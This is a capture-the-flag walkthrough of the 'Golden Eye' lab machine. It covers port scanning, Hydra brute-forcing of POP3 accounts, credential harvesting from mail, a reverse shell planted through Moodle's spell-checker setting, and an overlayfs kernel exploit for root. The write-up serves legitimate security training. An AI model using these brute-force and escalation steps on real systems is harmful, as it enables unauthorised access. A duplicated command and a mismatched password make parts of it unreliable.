> Golden Eye | James Bond

**export IP=10.10.153.143**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
25/tcp open  smtp    syn-ack ttl 63 Postfix smtpd
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/pop3 syn-ack ttl 63 Dovecot pop3d
55007/tcp open  pop3     syn-ack ttl 63 Dovecot pop3d
```

Looking at the page source we have `terminal.js` and it saya it has `Boris's` password but encrypted.

`//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;`

## ASCII encoded

`InvincibleHack3r`

IN port 80, it says our login is at `/sev-home/`. We have an authentication. Let's try `boris`:`InvincibleHack3r`

We have not saying pop3 is running at higher port for security purposes.

# Hydra Time

Ok! we can't login to the pop3 server at port 55006 using boris account so let's try another user we say at first `natalya`. Let's work with hydra.

sudo hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://$IP:55007

```
[55007][pop3] host: 10.10.153.143   login: natalya   password: bird
```

And we can login to the pop3 service using this password.

```
USER natalya
PASS bird
LIST # List messages
RETR 1 # Accesing 1'st message (This gives us an username janus)
RETR 2 # Says us to add severnaya-station.com to our /etc/hosts file and credentials of another user `xenia`:`RCP90rulez!`
```

Let's try Boris password too.

sudo hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://$IP:55007

```
[55007][pop3] host: 10.10.153.143   login: boris   password: secret1!
```

Looking at Boris's mail we found something suspicious

```
From: alec@janus.boss
We are said that Xenai is trying to do something bad. We already have cred's of Xenia.
```

And accessing `http://severnaya-station.com/gnocertdir` we have a login and we can login as xenia. And looking at his messages we have another user `Doak`.

Let's try hydra again to crack Doak's pop3 password.

sudo hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://$IP:55007

```
[55007][pop3] host: 10.10.153.143   login: doak   password: goat
```

We have doak's password `dr_doak`:`4England!`. And looking at his moodle account he has a `secret.txt`. It says something juicy is located in `/dir007key/for-007.jpg`

And exiftool the image we have `eFdpbnRlcjE5OTV4IQ==` => `xWinter1995x!`

We got admin credentials `admin`:`xWinter1995x!`. And we can login to the admin's moodle account.

## Hint : SPell Checker Plugin. Enabling the PSpellSpell and placing our python reverse shell we have one step to go. Now let's create a new entry and click `Toggle SpellChecker`

We are in as www-data. We are said that this system is affected to the overluayfs exploit. Looking at the kernel version let's pull exploit from searchsploit.

Be don't have an gcc to compile the .c file. But we have cc. Let's replace gcc with cc.

`sed -i "s/gcc/cc/g" exploit.c`

And now let's compile

`sed -i "s/gcc/cc/g" exploit.c`

Running it we are root!

```
568628e0d993b1973adc718237da6e93
```